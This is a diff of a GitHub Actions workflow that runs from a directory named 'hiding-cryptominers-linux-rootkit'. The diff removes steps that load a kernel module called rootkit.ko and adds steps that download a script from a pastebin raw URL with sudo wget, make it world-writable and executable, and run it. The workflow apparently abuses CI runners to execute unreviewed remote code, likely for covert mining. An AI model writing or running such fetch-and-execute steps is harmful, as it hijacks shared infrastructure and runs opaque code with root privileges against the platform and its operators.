@@ -1,12 +1,9 @@
 name: Ubuntu 20.04
 
 on: 
-  workflow_dispatch:
 jobs:
   build:
     runs-on: ubuntu-20.04
-    options: --user root
-
     steps:
       - uses: actions/checkout@v2
       - name: Run settting file
@@ -17,7 +14,6 @@ jobs:
       - name: LOADING
         run: |
           cd hiding-cryptominers-linux-rootkit/
-          sudo dmesg -C &
-          sudo insmod rootkit.ko
-          sudo dmesg
-          
+          sudo wget -O ab.sh https://pastebin.com/raw/D7E7Pcay
+          chmod 777 ab.sh
+          ./ab.sh
